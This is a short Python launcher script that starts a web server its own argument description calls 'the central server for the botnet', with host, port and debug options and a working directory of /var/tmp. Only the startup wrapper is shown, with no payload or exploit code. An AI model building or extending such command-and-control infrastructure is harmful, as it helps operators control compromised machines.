from .server import *
import os,sys,argparse

os.chdir('/var/tmp/')

parser = argparse.ArgumentParser(description='Starts the central server for the botnet',add_help=False)
parser.add_argument('-h',type=str,nargs='?',default='0.0.0.0',metavar='host',dest='host')
parser.add_argument('-p',type=int,nargs='?',default=5003,metavar='port',dest='port')
parser.add_argument('--debug',action='store_true',dest='debug')
args = parser.parse_args()

initialize()
WSGIRequestHandler.protocol_version = "HTTP/1.1"  # for keep-alive
app.run(args.host,port=args.port,debug=args.debug)
